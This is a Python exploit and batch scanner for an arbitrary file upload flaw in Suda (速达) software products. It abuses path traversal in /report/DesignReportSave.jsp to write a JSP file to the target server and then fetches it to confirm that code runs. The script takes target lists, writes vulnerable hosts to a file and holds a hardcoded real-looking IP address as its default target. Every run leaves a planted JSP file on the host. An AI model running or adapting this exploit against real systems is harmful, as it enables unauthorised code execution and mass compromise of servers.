import requests
import argparse
import time
import warnings
warnings.filterwarnings("ignore")

payload=r"/report/DesignReportSave.jsp?report=../625248.jsp"

def print_colored(text, color):
    colors = {
        'black': '\033[0;30m',
        'red': '\033[0;31m',
        'green': '\033[0;32m',
        'yellow': '\033[0;33m',
        'blue': '\033[0;34m',
        'purple': '\033[0;35m',
        'cyan': '\033[0;36m',
        'white': '\033[0;37m'
    }
    reset = '\033[0m'
    if color in colors:
        colored_text = colors[color] + text + reset
        print(colored_text,end='')
    else:
        print(text,end='')
        

def send_post(url):
    flag=True
    try:
        response=requests.post(f"{url}{payload}",data=r'<% out.print("984969719");%>')
        if response.status_code ==200:
            return flag
        else:
            print_colored("[-] 无法访问\n","red")
            flag=False
            return flag
    except Exception as e:
        # print("请求失败")
        print_colored("[-] 请求出错\n","red")
        flag=False
        return flag
        

def send_get(url):
    try:   
        response=requests.get(f"{url}/625248.jsp",timeout=5)
        if response.status_code==200:
            content=response.text
            if "984969719" in content:
                print_colored(f'[+] {url} 存在速达软件全系产品任意文件上传漏洞 ','green')
                print_colored(f"漏洞路径 {url}{payload}，上传文件路径 {url}/625248.jsp",'yellow')
                print()
                res=f"漏洞路径 {url+payload}，上传文件路径 {url}/625248.jsp"
                return res
            else:
                print(url,end=' ')
                print_colored('[-] 不存在速达软件全系产品任意文件上传漏洞 ','red')
                print()
        else:
            print_colored("[-] 无法访问","red")
    except Exception as e:
        print(f"{url} 请求超时")
        

def main():
    url="http://61.175.213.14:8088"
    parser = argparse.ArgumentParser(description='命令行参数示例')
    # 添加参数选项
    parser.add_argument('-u', '--url', type=str, help='单个url')
    parser.add_argument('-f', '--file', type=str, help='url文本文件路径')
    parser.add_argument('-o', '--output', type=str, help='保存结果')
    # 解析命令行参数
    args = parser.parse_args()
    
    if args.url:
        flag1=send_post(args.url)
        if flag1:
            send_get(args.url)
    if args.file:
        with open(args.file,'r') as f1:
            fs=f1.readlines()
            for u in fs:
                url=u.strip()
                flag2=send_post(url)
                if flag2:
                    res=send_get(url)
                    if args.output:
                        with open(args.output+"/速达软件全系产品任意文件上传漏洞.txt",'a+',encoding='utf-8') as f2:
                            if res==None:
                                pass
                            else:
                                f2.write(f"{res}\n")
    
main()
    
    